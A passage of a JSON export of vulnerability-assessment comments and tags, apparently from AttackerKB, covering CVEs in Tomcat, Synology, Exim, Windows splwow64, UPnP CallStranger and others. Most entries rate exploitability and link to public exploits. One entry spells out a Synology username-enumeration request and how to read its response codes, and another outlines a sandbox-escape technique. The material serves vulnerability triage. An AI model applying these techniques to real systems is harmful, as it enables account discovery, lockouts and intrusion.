          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "180291a1-d2a7-44e5-824e-6c5da7489efe",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "62aca1a2-f48c-4702-9d23-1d94f589d05b",
      "created": "2020-05-21T05:50:32.370787Z",
      "revisionDate": "2020-05-21T05:52:49.293766Z",
      "document": "Metasploit exploit module PR'd [here](https://github.com/rapid7/metasploit-framework/pull/13494).",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "difficult_to_patch",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b5f34a8f-ab6c-4b88-9624-b4fb81f393a3",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "d327555b-f2b1-46e2-9304-d78576927c42",
      "created": "2020-05-21T05:51:58.984788Z",
      "revisionDate": "2020-05-21T05:51:58.986535Z",
      "document": "Metasploit exploit module [already in the tree](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/netsweeper_webadmin_unixlogin.rb).",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "pre_auth",
          "high_privilege_access",
          "difficult_to_patch",
          "easy_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2ffddf9c-dad9-4d0d-bf94-c034d3f9d170",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "cc03df11-f634-4bad-8fd3-e6f539cc6131",
      "created": "2020-05-21T14:01:22.142412Z",
      "revisionDate": "2020-05-21T14:12:22.501911Z",
      "document": "Vulnerability is trivial to exploit.  Send a `GET` request to `/webman/forget_passwd.cgi?user=<username>` and check the response.\r\nA user who can login will give:\r\n```\r\n{\r\n   \"info\" : \"admin group\",\r\n   \"msg\" : 1\r\n}\r\n```\r\nA user who can't login will give:\r\n```\r\n{\r\n   \"info\" : \"no mail or no priviege\",\r\n   \"msg\" : 2\r\n}\r\n```\r\nAn invalid user will give:\r\n```\r\n{\r\n   \"info\" : \"get user info failed\",\r\n   \"msg\" : 4\r\n}\r\n```\r\n`msg` 3 means either the feature is disabled, or patched.\r\n`msg` 5 means you're locked out.\r\n\r\nDefault lockout policy is 10 logins in 5min.  Each username enumeration counts as a login.  Lockout is permanent by default.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6f8ec306-5d20-4afc-b946-dadfa700b9f0",
      "editorId": "7dcb2bba-0893-4a4b-a2c9-152965f852b9",
      "topicId": "f05ac4f4-854a-4a3b-8d2f-14902518b15e",
      "created": "2020-05-27T14:02:21.441373Z",
      "revisionDate": "2020-05-27T14:02:21.445519Z",
      "document": "The key feature of this bug in @agalauner-r7's assessment here is, \"Don\u2019t let anybody disassemble your machine.\" I'm calling this issue \"authenticated\" because if you're in a position to turn some screws on the case, you're practically authenticated. :)",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "common_enterprise",
          "default_configuration",
          "post_auth",
          "difficult_to_exploit",
          "difficult_to_develop"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "ee5c1e0b-3114-40a4-ae63-6433f5546bc5",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "da5848c9-94aa-49c8-85bd-ee5619cafc6a",
      "created": "2020-05-27T16:08:25.041665Z",
      "revisionDate": "2020-06-10T21:04:52.457859Z",
      "document": "This particular vulnerability is related to insecure permissions created on the install location of the SmartDraw application. This can be leveraged for privilege escalation (or persistence) by dropping an executable within this directory. A scheduled task will run the executable as the user who installed SmartDraw. While it's possible to install SmartDraw as a non-Admin user, it is most likely to be installed with administrative privileges, allowing the attacker to run within this context.\r\n\r\nIt should be noted that this vulnerability has been patched, however installations that were installed before the patch was released will remain vulnerable after upgrading. In order to remediate the vulnerability and correct the permissions issue, the application must first be uninstalled and then the patched version must be reinstalled in it's place.\r\n\r\nSee the original disclosure [here](https://improsec.com/tech-blog/how-not-do-handle-responsible-disclosure-smartdraw-2020).",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "difficult_to_patch",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "12cc48f1-2c63-47f1-ba10-acd68824600a",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "d6cd45b9-f610-4480-99e7-80a4065df5fd",
      "created": "2020-05-28T16:49:04.724503Z",
      "revisionDate": "2020-05-28T16:49:04.72853Z",
      "document": "Untested POC exists\r\n\r\nhttps://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim/blob/master/PoC_CVE-2019-10149.py",
      "score": 1,
      "metadata": {
        "tags": [
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "5b86e2e5-ab88-42fe-962c-dbf9522e486b",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "84538e82-69bd-4e8e-97de-bb0c4844b558",
      "created": "2020-05-28T22:10:04.113416Z",
      "revisionDate": "2020-06-10T21:04:37.882049Z",
      "document": "A vulnerability exists within `splwow64.exe` that can be exploited via an LPC to execute code within the context of that process. The `splwow64.exe` process is started when a 32-bit process on a 64-bit version of Windows attempts to print. The process is spawned as the same user and thus, the code would be executed as that user. Because of this, the vulnerability could not be used to escalate privileges but rather is limited to use as a sandbox escape from a Low integrity process (such as an Internet Explorer window) to a High integrity process. I rate this as low attacker value because the utility class is pretty limited to use as a sandbox escape.\r\n\r\nExploiting this vulnerability involves opening a handle to it and creating a shared section that when combined with the LPC can be leveraged into a write-what-where primitive. This can then be used with knowledge of the the base address of key DLLS to overwrite a pointer within the `.data` section that can be referenced for controlled code execution.\r\n\r\nThis vulnerability reportedly still affects 64-bit versions of Windows 7 and has no public PoC code.\r\n\r\nAnalysis based on [Chronicles of a Sandbox Escape: Deep Analysis of CVE-2019-0880](https://byteraptors.github.io/windows/exploitation/2020/05/24/sandboxescape.html),",
      "score": 2,
      "metadata": {
        "tags": [
          "pre_auth",
          "no_useful_data",
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "6c66c3b9-f05f-4b6d-b07e-769671aae090",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "eb865f74-b9f8-4ff3-926a-4a6b3a0ba203",
      "created": "2020-05-29T19:39:45.82498Z",
      "revisionDate": "2020-05-29T21:45:53.082544Z",
      "document": "This vulnerability enables attackers to break the security boundaries that an Active Directory forest claims to maintain. This is due to a flaw in Kerberos and forest trusts themselves. No details were disclosed so far, but the author ([@_dirkjan](https://twitter.com/_dirkjan)) is going to talk about it at [Blackhat Asia](https://www.blackhat.com/asia-20/briefings/schedule/#walking-your-dog-in-multiple-forests---breaking-ad-trust-boundaries-through-kerberos-vulnerabilities-18818) later this year (if Mr. Covid lets it happen).\r\n\r\nThis issue reminds me of [this attack](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)  disclosed in 2018, which also targets Active Directory forest security boundaries. This leads to a complete compromise of resources in any forest with a two-way interforest trust. According to Microsoft [advisory](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0665), the severity of @_dirkjan's vulnerability is only rated as `Important`. If the level of compromise is similar than 2018's attack, I believe it is much more critical.",
      "score": 2,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "common_enterprise",
          "high_privilege_access",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "01ca1da1-706a-49e8-9753-a994f84f3733",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "9eb7cedf-02a1-46f2-a85d-0ed65bfd9b52",
      "created": "2020-06-04T08:27:57.369085Z",
      "revisionDate": "2020-06-04T08:27:57.372775Z",
      "document": "see [cve-2020-10220](https://attackerkb.com/topics/QtNg2pyrm2/cve-2020-10220)",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "4c119929-d4bc-4e83-98f7-7cbf12addddd",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "7d55ec92-6278-4c2b-ad29-c886202d1217",
      "created": "2020-06-04T08:28:30.599989Z",
      "revisionDate": "2020-06-04T08:28:30.602102Z",
      "document": "see [cve-2020-10220](https://attackerkb.com/topics/QtNg2pyrm2/cve-2020-10220)",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "1828ae32-f759-4431-8f1c-db1c3609f0de",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "85ddc128-1ce2-4590-954a-13425e6ba9d8",
      "created": "2020-06-04T08:28:56.339904Z",
      "revisionDate": "2020-06-04T08:28:56.342585Z",
      "document": "see [cve-2020-10220](https://attackerkb.com/topics/QtNg2pyrm2/cve-2020-10220)",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "84553011-5c1b-4d81-883b-6e12ce993a5e",
      "editorId": "609518a5-561e-4f03-b60e-4b8f0f7e91bc",
      "topicId": "9527f9ce-9a8a-4c09-9224-6ebb1c1ce080",
      "created": "2020-06-04T08:29:19.958807Z",
      "revisionDate": "2020-06-04T16:45:13.166161Z",
      "document": "see [cve-2020-10220](https://attackerkb.com/topics/QtNg2pyrm2/cve-2020-10220)",
      "score": 2,
      "metadata": {
        "tags": [
          "pre_auth",
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "04f65989-f6a8-4d17-8878-edf28868e390",
      "editorId": "4279447e-31e4-49c4-9efc-c7607f30296b",
      "topicId": "ed1d16c7-d18b-4817-ae00-f0813ee1c308",
      "created": "2020-06-05T13:28:41.579744Z",
      "revisionDate": "2020-07-09T15:35:19.789166Z",
      "document": "Based on the great research work by [Orange Tsai](Orange Tsai), exploiting this vulnerability is made fairly trivial.  Adding exploited in the wild based on notes from EU CERT https://media.cert.europa.eu/static/SecurityAdvisories/2019/CERT-EU-SA2019-017.pdf . Since this is VPN software, it's often keys to the kingdom. Hope everyone has patched by now.",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "exploited_in_the_wild"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "dec4f849-36dd-4e26-979f-91eecfac909d",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "cf682e2c-a2c3-4c54-8e34-fc86241fd935",
      "created": "2020-06-05T19:31:34.287113Z",
      "revisionDate": "2020-06-05T19:31:34.300786Z",
      "document": "Not many details have been released regarding this vulnerability, Despite that, exploitation sounds trivial, and the result is code execution as `root`. This should definitely be patched.",
      "score": 1,
      "metadata": {
        "tags": [
          "pre_auth",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "b8b8cca3-f264-4dc0-8813-0d648bbb8ac3",
      "editorId": "5b7ea684-6f0e-40dd-8c7c-e7dcc23cd75c",
      "topicId": "38f76c83-56d0-4112-a583-4513cc15b1b3",
      "created": "2020-06-06T13:41:27.108672Z",
      "revisionDate": "2020-08-11T16:34:18.034128Z",
      "document": "This attack can have high impact (RCE), but the conditions that need to be met make the likelihood of exploitation low.\r\n\r\n1. PersistentManager needs to be enabled manually by the tomcat administrator. This is likely to happen only on websites with high traffic loads (but not too high, as it will be more likely that a JDBC Store is used instead of a File Store)\r\n2. The attacker has to find a separate file upload vulnerability to place the malicious serialized file on the server.\r\n3. There have to be libraries on the classpath which are vulnerable to be exploited by a Java deserialization attack (e.g. gadgets).\r\n\r\nHowever, a large range of versions of tomcat are affected.\r\n\r\nMore info in this article: https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/",
      "score": 6,
      "metadata": {
        "tags": [
          "pre_auth",
          "obscure_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "52c01644-4ade-4e07-b820-d48cce51b328",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "38f76c83-56d0-4112-a583-4513cc15b1b3",
      "created": "2020-06-07T00:22:16.865033Z",
      "revisionDate": "2020-06-08T15:34:22.90944Z",
      "document": "@cblack-r7 and I looked at this a couple weeks ago, specifically https://seclists.org/oss-sec/2020/q2/136 and https://github.com/IdealDreamLast/CVE-2020-9484. I did a double take because I thought it included a file write. Not so. There are a handful of prerequisites that mitigate the impact of this vulnerability.\r\n\r\nIf the stars align, this could be valuable, since Tomcat is everywhere. But I don't think it's worth writing an exploit for this, beyond a PoC, since exploitation is so niche. @redtimmy's writeup is most excellent. Go read that.",
      "score": 2,
      "metadata": {
        "tags": [
          "pre_auth",
          "obscure_configuration",
          "difficult_to_develop",
          "common_enterprise"
        ],
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "d48431b5-7d2b-4d77-b48b-b97d8abc77ad",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "ba8fc1dc-21f7-48c7-b5f4-2b2eb96e2bec",
      "created": "2020-06-08T18:38:21.512768Z",
      "revisionDate": "2020-06-08T18:38:21.519172Z",
      "document": "Ben Murphy's dissection \u2014 <https://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/> \u2014 is pretty thorough. ",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "exploited_in_the_wild"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8d77d6c8-0e45-4eb3-9d78-8778bb4dccb4",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "db7d4d6f-62df-4b24-b7a1-c8b584415e20",
      "created": "2020-06-09T07:51:59.745313Z",
      "revisionDate": "2020-06-09T23:24:12.580531Z",
      "document": "This one has a name and a website. - https://callstranger.com/\r\n\r\nThere is also a github repository that has PoC code, this code will scan your local IP range to determine if you have vulnerable devices. Be aware this POC will send data about your network out to a 3rd party. It claims to encrypt this data, but I have not reviewed the implementation. \r\nIt may not have a list of internal UPNP Devices, but it will have a record of your IP, how much data was sent.\r\n\r\nhttps://github.com/yunuscadirci/CallStranger\r\n\r\n#### Root Cause\r\n\r\nA Callback header that can be controlled by the attacker in the `UPnP SUBSCRIBE` functionality can lead to SSRF-Like behaviour\r\n\r\n#### Threat\r\n\r\n### DDOS:\r\nThis seems to be the obvious one that will get picked up by most botnet operators at some point. \r\n\r\n### DLP\r\nDon't expect this to be a likely threat, there are easier ways to bypass outgoing DLP restrictions than this. \r\n\r\n### SSRF Like\r\nNeeds more review but `Scanning internal ports from Internet-facing UPnP devices` could be useful, depending on what data is returned. \r\n\r\n\r\n",
      "score": 4,
      "metadata": {
        "tags": [
          "pre_auth",
          "difficult_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
